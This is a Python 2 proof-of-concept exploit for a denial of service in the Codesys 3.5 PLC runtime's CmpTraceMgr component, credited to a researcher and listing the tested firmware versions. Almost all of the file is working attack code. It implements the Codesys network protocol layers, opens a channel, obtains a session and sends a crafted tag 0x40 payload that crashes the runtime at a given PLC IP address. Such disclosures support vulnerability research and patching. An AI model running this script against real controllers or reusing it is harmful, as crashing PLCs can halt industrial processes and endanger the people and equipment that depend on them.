#! /usr/bin/env python2
import sys, socket, random, string, binascii, argparse
from struct import *

'''
Denial of Service in Codesys 3.5 Runtime via CmpTraceMgr component

Injection point: Affected Layer7 service: TraceMgr 0x0f RecordAdd 0x0d via Tag 0x40
Impact: A crafted network packet causes SIGSEGV, crashes the runtime

Tested on following:

SoftPLC CODESYS Control V3.5.16.40 for x86-32Bit - build Apr 19 2021
Wago PFC200 03.00.39(FW12) CODESYS Control V3.5.16.20 for ARM-32Bit - build Dec 2 2020
RPI3 B+: CODESYS Control V3.5.17.10 for ARM-32Bit - build Aug 27 2021 (with CmpUserMgr.SECURITY.UserMgmtEnforce=NO)
RPI3 B+ CODESYS Control V3.5.16.20 for ARM-32Bit - build Dec  2 2020 (both singlecore armv6l and multicore armv7l)


No loaded Application or trace object required
Note for Runtime versions >=3.5.17.0: The bug is exploitable with "CmpUserMgr.SECURITY.UserMgmtEnforce=NO" flag set in the CODESYSControl.cfg.
In lower versions, the vulnerable service is directly reachable by default.

PoC reuses some parts from Tenable TRA-2020-04: 
https://raw.githubusercontent.com/tenable/poc/master/codesys/codesys_gateway_v3_config_modification_tra_2020_04.py

Credit: icsbob

'''

def hexdump(src, length=16):
  DISPLAY = string.digits + string.letters + string.punctuation
  FILTER = ''.join(((x if x in DISPLAY else '.') for x in map(chr, range(256))))
  lines = []
  for c in xrange(0, len(src), length):
    chars = src[c:c+length]
    hex = ' '.join(["%02x" % ord(x) for x in chars])
    if len(hex) > 24:
      hex = "%s %s" % (hex[:24], hex[24:])
    printable = ''.join(["%s" % FILTER[ord(x)] for x in chars])
    lines.append("%08x:  %-*s  %s\n" % (c, length*3, hex, printable))
  return ''.join(lines)

def dump(title, data):
  print '--- [ %s ] --- ' % (title)
  print hexdump(data)

def recvall(sock, n):
  data = ''
  while len(data) < n:
      packet = sock.recv(n - len(data))
      if not packet:
          return None
      data += packet
  return data

def tcp_blk_drv_send(sock, data):
  pdu = pack('<II',0xe8170100, len(data) + 8) + data
  sock.sendall(pdu)

def tcp_blk_drv_recv(sock):
  data = ''
  data = recvall(sock, 0x8)
  (magic, size) = unpack('<II', data)
  if magic != 0xe8170100:
    raise ValueError('Invalid magic number.')
  if size:
    data = recvall(sock, size - 8)
  return data


def layer3(service, data, sender='\x00'*8, receiver='\x00'*6):

  slrl = ((len(sender) / 2) << 4) | ((len(receiver) / 2) & 0xf)
  hc = 13
  hl = 3
  b2 = ((hc << 3) & 0xf8) | (hl & 0x7)

  pri = 1
  sr = 0
  addr_type = 0
  max_blk_len = 0
  msg_id = 0

  b3 =  ((pri << 6) & 0xc0) | ((sr << 5) & 0x20)
  b3 |= ((addr_type << 4) & 0x10) | (max_blk_len & 0xf)

  pdu  = pack('BBBBBB', 0xc5, b2, b3, service, msg_id, slrl)
  pdu += receiver
  pdu += sender

  if len(pdu) % 4:
    pdu += '\x00' * (4 - len(pdu) % 4)

  pdu += data

  return pdu


def layer4(chan, blk, ack, flags, data):

  pdu  = '\x01'
  pdu += pack('<BHII',flags, chan, blk, ack)
  pdu += data

  return pdu


def layer4_meta(type, data):

  type |= 0xC0 # Meta request from client
  pdu  = pack('<BBH', type, 0, 0x0101)
  pdu = pdu + pack('<i', binascii.crc32(pdu + '\x00'*4 + data)) + data
  return pdu


def layer7(svc_group, svc_num, sess_id, data):

  hdr  = pack('<HHII',svc_group, svc_num, sess_id, len(data))
  hdr += pack('<HH', 0, 0)

  pdu  = pack('<HH',0xcd55, len(hdr))
  pdu += hdr
  pdu += data

  pdu = pack('<Ii', len(pdu), binascii.crc32(pdu)) + pdu

  return pdu

def btag_encode_int(val):

  if(val <= 0x7f):
    return pack('B',val)

  elif (val <= 0x3fff):
    return pack('BB',(val & 0x7f) | 0x80, (val >> 7) & 0x7f)

  elif (val <= 0x1fffff):
    return pack('BBB',
      (val & 0x7f) | 0x80,
      (val >> 7) | 0x80,
      (val >> 14) & 0x7f
    )

  elif (val <= 0xfffffff):
    return pack('BBBB'
      (val & 0x7f)  | 0x80,
      (val >> 7)    | 0x80,
      (val >> 14)   | 0x80,
      (val >> 21) & 0x7f
    )

  else:
    raise ValueError('Value too big to encode.')

def btag_decode_int(data, pos):
  max = 0xffffffff
  lshift = 0
  dlen = len(data)

  val = 0
  t = 0
  while True:
    if(pos >= dlen):
      return None

    t = ord(data[pos])
    if((t & 0x7f) > max):
       return None

    val += ((t & 0x7f) << lshift)
    pos += 1
    lshift += 7
    max = max >> 7

    if (t & 0x80 == 0):
      break

  return [val, pos]

def btag_parse(data, pos):

  ret = btag_decode_int(data, pos)
  if ret == None:
    return None
  id  = ret[0]
  pos = ret[1]


  ret = btag_decode_int(data, pos)
  if ret == None:
    return None

  size  = ret[0]
  pos = ret[1]


  value = data[pos:pos+size]
  pos += size

  return [id, value, pos]


def get_btags(data):
  dlen = len(data)
  pos = 0
  tags = {}
  while pos < dlen:
    ret = btag_parse(data, pos)
    if ret == None:
      return None
    id = ret[0]
    value = ret[1]
    pos   = ret[2]
    tags[id] = value

  return tags

def s_tag(id, value):
  tag  = btag_encode_int(id)
  tag += btag_encode_int(len(value))
  tag += value

  return tag

def get_layer4(L3):
  hdr_len = ord(L3[1]) & 0x7
  slrl = (ord(L3[5]) >> 4) | (ord(L3[5]) & 0xf)
  pos = hdr_len + slrl
  pos = pos + (pos % 2)
  pos = pos * 2

  return L3[pos:]

def get_layer7(L4):
  return L4[20:]

def get_layer7_body(data, layer):
  if layer == 3:
    L4 = get_layer4(data)
    L7 = get_layer7(L4)
  elif layer == 4:
    L7 = get_layer7(data)
  elif layer == 7:
    L7 = data
  else:
    raise ValueError('Invalid layer')

  (proto, hdr_size,) = unpack_from('<HH',L7)
  if proto != 0xcd55:
    raise ValueError('Invalid layer 7 protocol')

  return L7[(4 + hdr_size):]


def send_layer7(soc, channel, blk, ack, data):
  L4 = layer4(channel, blk, ack, 0x81, data)
  L3 = layer3(64, L4)
  tcp_blk_drv_send(soc, L3)
  blk += 1
  return blk

# ************************ #

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('-t', required=True, help='PLC IP')
arg_parser.add_argument('-p', type=int, default=11740, help='Codesys TCP port')

args = arg_parser.parse_args()
host = args.t
port = args.p

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((host, port))

# Open a channel
data = pack('<II',random.randint(1, 0xffffffff),0x1f4000)
data += '\x08\x00\x00\x00'

L4 = layer4_meta(3,data)
L3 = layer3(64, L4)

tcp_blk_drv_send(s, L3)
res = tcp_blk_drv_recv(s)

L4 = get_layer4(res)

# Get status and channel ID
(status,channel,) = unpack_from('<HH', L4, 12)

if status != 0 or channel == 0xffff or channel == 0:
  print 'Failed to open a channel.'
  s.close()
  sys.exit(1)

#
# Get a session id
#
blk = 1
ack = 0
tag_10 = s_tag(0x10, '\x00\x00')
data = s_tag(0x22, pack('<H', 1)) + s_tag(0x81, tag_10)
L7 = layer7(1,2,0x11,data)
blk = send_layer7(s, channel, blk, ack, L7)
res = tcp_blk_drv_recv(s)

L4 = get_layer4(res)
dump('L4 res', L4)
ack = unpack_from('<I', L4, 4)[0]

L7_body = get_layer7_body(L4, 4)
dump('L7 res body', L7_body)

tags = get_btags(L7_body)

if 0x82 not in tags:
  print 'btag 0x82 not found in response'
  s.close()
  sys.exit(1)

data = tags[0x82]
tags = get_btags(data)

if not all (k in tags for k in (0x20, 0x21)):
  print 'btag 0x20 or 0x21 not found in response'
  s.close()
  sys.exit(1)

status  = tags[0x20]
sess_id = tags[0x21]

if len(status) != 2:
  print 'Length of status btag is not 2 bytes'
  s.close()
  sys.exit(1)

status = unpack('<H', status)[0]
if status != 0:
  print 'Response status not ERR_OK'
  s.close()
  sys.exit(1)

if len(sess_id) != 4:
  print 'Length of session id btag is not 4 bytes'
  s.close()
  sys.exit(1)

sess_id = unpack('<I', sess_id)[0]

# Send L7 payload to TraceMgr 0x0f RecordAdd 0x0d
tag_84_contains = \
    "\x21\x84\x80\x00\x01\x02\x00\x00"\
    + s_tag(0x4e,"\x05\x00\x00\x00")\
    + s_tag(0x4d,"\x02\x02\x10\x06\x00\x00\x00\x00")\
    + s_tag(0x20,"\x50\x4c\x43\x5f\x50\x52\x47\x2e\x69\x6e\x70\x75\x74\x00\x00\x00") \
    + s_tag(0x25, "\x02\x00\x00\x00") \
    + s_tag(0x26, "\x02\x00\x00\x00") \
    +"\x27\x84\x80\x00" \
"\x01\x00\x00\x00\x28\x84\x80\x00\xff\x00\x00\xff\x32\x84\x80\x00" \
"\x00\x00\x00\x00\x35\x84\x80\x00\x00\x00\x00\x00\x38\x84\x80\x00" \
"\x00\x00\x00\x00\x33\x84\x80\x00\x00\x00\x00\x00\x34\x84\x80\x00" \
"\x00\x00\x00\xff\x36\x84\x80\x00\x00\x00\x00\x00\x37\x84\x80\x00" \
"\x00\x00\xff\xff"

# This is the main injection point (tag 0x40) which affects the SIGSEGV
# Some memory offset is derived from this value
# Later mov operation is performed on it by CmpTraceMgr when preparing to add trace record
# For x32 Intel/ARM (no ASLR), payload to cause crash would be 19000000 or FFFFFF7F
# Payloads like FFFFFFFF will not reach CmpTraceMgr and the Service Layer will return 0200
# Other payloads within a valid memory range will reach CmpTraceMgr and handled correctly as errors

off = "\x19\x00\x00\x00\x00\x00\x00\x00"
off = "\xff\xff\xff\xff\xff\xff\xff\x7f"
tagdata = s_tag(0x40, off)+s_tag(0x84, tag_84_contains)


L7 = layer7(0x0f, 0x0d, sess_id, tagdata)
blk = send_layer7(s, channel, blk, ack, L7)

res = tcp_blk_drv_recv(s)
L4 = get_layer4(res)
dump('L4 res', L4)
ack = unpack_from('<I', L4, 4)[0]
